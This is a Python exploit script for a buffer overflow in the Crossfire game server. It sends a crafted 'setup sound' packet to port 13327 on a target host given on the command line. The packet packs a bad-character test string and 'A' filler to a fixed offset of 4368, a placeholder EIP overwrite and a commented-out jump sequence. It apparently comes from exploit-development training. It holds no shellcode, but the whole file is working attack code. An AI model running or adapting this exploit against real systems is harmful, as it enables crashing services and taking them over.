#!/usr/bin/python3
#
# Crossfire buffer overflow

import socket
import argparse
import time

# Script arguments
parser = argparse.ArgumentParser(description='Crossfire buffer overflow')
parser.add_argument('host', help='host to target')
parser.add_argument('exclude', help='hex of ascii characters to exclude', nargs='*', type=str)
args = parser.parse_args()

# Convert hex values to decimal for later use in filter
excl_dec = [int(e,16) for e in args.exclude]
verifychars = ''.join(chr(i) for i in range(128) if i not in excl_dec)
filler = 'A' * (4368 - len(verifychars))
eip = 'BBBB'
redirect = 'C' * 7
#redirect = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + verifychars + filler + eip + redirect + "\x90\x00#"
buffer = buffer.encode('latin-1')
print(f"length of buffer is {len(buffer)}")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.host, 13327))
time.sleep(1)
print(s.recv(1024))
s.send(buffer)
s.close()
